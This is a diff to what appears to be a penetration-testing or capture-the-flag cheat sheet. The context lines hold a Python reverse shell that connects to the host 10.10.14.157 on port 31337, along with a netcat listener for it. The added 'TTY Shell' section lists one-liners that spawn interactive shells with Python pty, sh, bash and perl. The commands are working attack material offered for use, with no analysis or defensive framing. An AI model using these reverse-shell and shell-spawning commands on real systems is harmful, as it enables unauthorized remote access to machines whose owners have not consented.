@@ -234,6 +234,17 @@ python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOC
 echo "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.10.14.157\",31337));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);" > .exploit.py
 ```
 - __`nc -lnvp 31337`__
+- 
+
+### TTY Shell
+```sh
+python -c 'import pty; pty.spawn("/bin/bash")'
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+echo 'os.system('/bin/bash')'
+/bin/sh -i
+/bin/bash -i
+perl -e 'exec "/bin/sh";'
+```
 
 # 12. [Password Cracking](/hash_cracking.md)
 
